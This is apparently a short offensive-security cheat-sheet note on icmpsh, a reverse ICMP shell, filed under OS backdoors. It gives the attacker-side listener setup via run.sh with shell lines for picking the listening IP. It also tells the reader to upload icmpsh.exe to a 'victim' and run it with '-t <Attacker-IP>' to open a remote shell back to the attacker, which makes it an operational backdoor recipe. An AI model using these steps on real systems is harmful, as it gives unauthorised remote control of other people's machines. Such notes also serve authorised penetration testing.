# 💢 icmpsh
Tags: #💢
Related to: 
See also: 
Previous: [[OS Backdoors]]

---
## Description
icmpsh is a simple reverse ICMP shell with a win32 slave and a POSIX compatible master in C, Perl or Python. The main advantage over the other similar open source tools is that it does not require administrative privileges to run onto the target machine.

## Create backdoor

### Client side

Execute the script: **run.sh**

**If you get some error, try to change the lines:**

```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```

**For:**

```bash
echo Please insert the IP where you want to listen
read IP
```

### Victim Side

Upload **icmpsh.exe** to the victim and execute:

```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```

---
## References
- https://github.com/inquisb/icmpsh